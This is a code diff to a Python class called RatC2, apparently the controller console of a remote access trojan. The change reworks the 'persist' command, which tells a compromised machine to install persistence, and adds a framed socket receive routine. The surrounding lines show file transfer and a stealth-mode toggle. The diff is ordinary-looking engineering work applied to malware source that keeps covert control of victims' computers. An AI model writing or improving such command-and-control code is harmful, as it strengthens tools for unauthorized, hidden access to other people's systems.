@@ -264,13 +264,35 @@ class RatC2(cmd.Cmd):
         if response and response.decode() == "READY":
             self._receive_file(filename)
 
-    def do_persist(self, arg):
-        """Install persistence mechanism: persist [method]"""
-        if not self._validate_session():
-            return
+    def do_persist(self, _):
+        """Handle persist command with proper error checking"""
+        self.sock.send(b'PERSIST')
+        try:
+            response = self._safe_recv()  # Use proper receive method
+            if response:
+                print(response.decode())
+            else:
+                print("Error: No response from server")
+        except Exception as e:
+            print(f"Persistence failed: {str(e)}")
 
-        response = self._send_command(f"PERSIST {arg}")
-        print(response.decode())
+    def _safe_recv(self):
+        """Proper message framing implementation"""
+        try:
+            header = self.sock.recv(4)
+            if not header:
+                return None
+            length = int.from_bytes(header, 'big')
+            data = bytearray()
+            while len(data) < length:
+                packet = self.sock.recv(min(4096, length - len(data)))
+                if not packet:
+                    return None
+                data.extend(packet)
+            return bytes(data)
+        except Exception as e:
+            print(f"Receive error: {str(e)}")
+            return None
 
     def do_stealth(self, arg):
         """Toggle stealth mode: stealth <on|off>"""
